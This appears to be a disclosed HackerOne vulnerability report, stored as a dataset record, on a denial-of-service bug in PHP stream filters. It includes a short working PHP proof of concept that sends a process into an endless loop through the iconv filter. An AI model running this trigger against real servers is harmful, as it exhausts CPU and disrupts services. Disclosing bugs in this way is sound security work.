---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '505278'
original_report_id: '505278'
title: DOS in stream filters
weakness: Uncontrolled Resource Consumption
team_handle: ibb
created_at: '2019-03-05T16:55:38.672Z'
disclosed_at: '2020-10-12T07:22:24.989Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 44
asset_identifier: PHP
asset_type: OTHER
max_severity: none
tags:
- hackerone
- uncontrolled-resource-consumption
---

# DOS in stream filters

## Metadata

- HackerOne Report ID: 505278
- Weakness: Uncontrolled Resource Consumption
- Program: ibb
- Disclosed At: 2020-10-12T07:22:24.989Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

see bug report
https://bugs.php.net/bug.php?id=76249

as simple as
<?php
$fh = fopen('php://memory', 'rw');
fwrite($fh, "abc");
rewind($fh);
stream_filter_append($fh, 'convert.iconv.iso-10646/utf8//IGNORE', STREAM_FILTER_READ, []);
echo stream_get_contents($fh);

=> one process running in an endless loop

## Impact

DOS, process ends up in an endless loop, CPU (or available php processes or both) of affected system get easily exhausted

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
